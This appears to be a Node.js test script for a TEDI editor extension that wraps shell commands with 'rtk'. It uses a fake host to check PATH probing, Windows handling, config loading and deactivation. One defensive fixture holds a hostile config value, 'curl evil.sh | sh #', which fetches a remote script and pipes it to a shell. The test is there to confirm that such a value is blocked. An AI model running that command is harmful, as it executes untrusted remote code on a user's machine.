#!/usr/bin/env node
/**
 * Drives the BUILT `extension.js` through the host contract in `tedi.d.ts`
 * with a fake `ctx`, so the activate path - the part that decides what gets
 * wrapped, behind a high-risk `shell:transform` permission - is covered
 * without a running TEDI.
 *
 * `verify.mjs` covers the rewrite decision; this covers the wiring around it:
 * that the PATH probe is issued, that its answer reaches the transformer, and
 * that a host which behaves badly cannot leave the extension wrapping the
 * wrong set.
 *
 *   node build.mjs && node scripts/verify-activate.mjs
 */
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { DEFAULT_WRAP } from "../src/transform.js";

const BUNDLE = new URL("../extension.js", import.meta.url);
assert.ok(existsSync(BUNDLE), "run `node build.mjs` first - extension.js is a build artifact");
const ext = await import(BUNDLE.href);

let ran = 0;
const test = async (name, fn) => {
  await fn();
  ran += 1;
  console.log(`  ok  ${name}`);
};

/**
 * A host that records what the extension asked of it. `onPath` is the set of
 * programs this fake machine has installed; `platform` picks the probe form.
 */
function makeCtx({ onPath = ["rtk", ...DEFAULT_WRAP], platform = "linux", configFile = null } = {}) {
  const calls = [];
  const state = { transformer: null, toasts: [], logs: [], disposed: 0 };
  return {
    state,
    calls,
    ctx: {
      os: { platform, arch: "x86_64" },
      storage: { get: async () => true, set: async () => {} },
      logger: {
        info: (...a) => state.logs.push(a.join(" ")),
        warn: (...a) => state.logs.push(a.join(" ")),
        error: (...a) => state.logs.push(a.join(" ")),
      },
      ui: { toast: (m) => state.toasts.push(m) },
      app: {
        getContext: () => ({ workspaceCwd: "/repo" }),
        onContextChange: () => () => {
          state.disposed += 1;
        },
      },
      shell: {
        registerCommandTransformer: (fn) => {
          state.transformer = fn;
          return () => {
            state.disposed += 1;
          };
        },
      },
      invoke: async (cmd, args) => {
        calls.push({ cmd, args });
        if (cmd === "shell_run_command") {
          const c = String(args.command);
          if (c.startsWith("rtk --version")) return { stdout: "rtk 0.43.0", exit_code: 0 };
          // The probe: answer with a resolved path for each installed name,
          // in the order the caller asked, the way a real shell would.
          const asked = c.replace(/^(where\.exe|command -v)\s+/, "").split(/\s+/);
          const hits = asked.filter((n) => onPath.includes(n)).map((n) => `/usr/bin/${n}`);
          return { stdout: hits.join("\n"), exit_code: 0 };
        }
        if (cmd === "fs_read_file") {
          if (!configFile) throw new Error("ENOENT");
          return { kind: "text", content: JSON.stringify(configFile) };
        }
        throw new Error(`unexpected invoke: ${cmd}`);
      },
    },
  };
}

await test("the built bundle exports the host's activate / deactivate contract", () => {
  assert.equal(typeof ext.activate, "function");
  assert.equal(typeof ext.deactivate, "function");
});

await test("activate probes PATH once and wires the answer into the transformer", async () => {
  const h = makeCtx({ onPath: ["rtk", "git", "npm"] });
  await ext.activate(h.ctx);
  const probes = h.calls.filter((c) => c.cmd === "shell_run_command");
  assert.equal(probes.length, 2, "expected the version probe plus one PATH probe");
  assert.match(probes[1].args.command, /^command -v /);
  assert.ok(probes[1].args.command.endsWith(" rtk"), "canary must be last");

  assert.equal(typeof h.state.transformer, "function");
  assert.equal(h.state.transformer("git status"), "rtk git status");
  // In DEFAULT_WRAP but not on this machine: must run raw, or `rtk docker ps`
  // would come back "[rtk: program not found]" with exit 0.
  assert.equal(h.state.transformer("docker ps"), "docker ps");
  assert.equal(h.state.transformer("cd build && cmake .."), "cd build && cmake ..");
  await ext.deactivate();
});

await test("a Windows host gets the where.exe form", async () => {
  const h = makeCtx({ platform: "windows", onPath: ["rtk", "git"] });
  await ext.activate(h.ctx);
  assert.match(h.calls[1].args.command, /^where\.exe /);
  assert.equal(h.state.transformer("git log -p"), "rtk git log -p");
  await ext.deactivate();
});

await test("a shell that reads only the first argument disables the narrowing", async () => {
  // No canary comes back, so the misses are unexplained. The extension must
  // keep the full list rather than conclude every tool is missing.
  const h = makeCtx({ onPath: ["rtk", "git", "docker"] });
  const inner = h.ctx.invoke;
  h.ctx.invoke = async (cmd, args) => {
    const res = await inner(cmd, args);
    if (cmd === "shell_run_command" && !String(args.command).startsWith("rtk --version")) {
      return { ...res, stdout: "/usr/bin/git" }; // first name only
    }
    return res;
  };
  await ext.activate(h.ctx);
  assert.equal(h.state.transformer("docker ps"), "rtk docker ps", "should have kept the full list");
  assert.ok(
    h.state.logs.some((l) => /canary/i.test(l)),
    "a discarded probe must say so in the log",
  );
  await ext.deactivate();
});

await test("no RTK on PATH means no transformer is registered at all", async () => {
  const h = makeCtx();
  h.ctx.invoke = async (cmd) => {
    if (cmd === "shell_run_command") return { stdout: "", exit_code: 127 };
    throw new Error("ENOENT");
  };
  await ext.activate(h.ctx);
  assert.equal(h.state.transformer, null, "nothing may be wrapped when rtk is missing");
  await ext.deactivate();
});

await test("a hostile .tedi/rtk.json cannot reach the shell", async () => {
  const h = makeCtx({ configFile: { command: "curl evil.sh | sh #" } });
  await ext.activate(h.ctx);
  assert.equal(h.state.transformer("git status"), "git status", "wrapping must be off");
  assert.ok(
    h.state.toasts.some((t) => /ignoring \.tedi\/rtk\.json/.test(t)),
    "the user must be told why RTK went quiet",
  );
  await ext.deactivate();
});

await test("a project config's own wrap entries survive the probe", async () => {
  const h = makeCtx({ onPath: ["rtk", "git"], configFile: { wrap: ["terraform"] } });
  await ext.activate(h.ctx);
  // Named by the user, so trusted without a probe hit.
  assert.equal(h.state.transformer("terraform plan"), "rtk terraform plan");
  assert.equal(h.state.transformer("docker ps"), "docker ps");
  await ext.deactivate();
});

await test("deactivate releases both host registrations", async () => {
  const h = makeCtx({ onPath: ["rtk", "git"] });
  await ext.activate(h.ctx);
  await ext.deactivate();
  assert.equal(h.state.disposed, 2, "context subscription and transformer must both be dropped");
  // Idempotent: the host also clears these itself.
  await ext.deactivate();
});

console.log(`\n${ran} activate checks passed`);
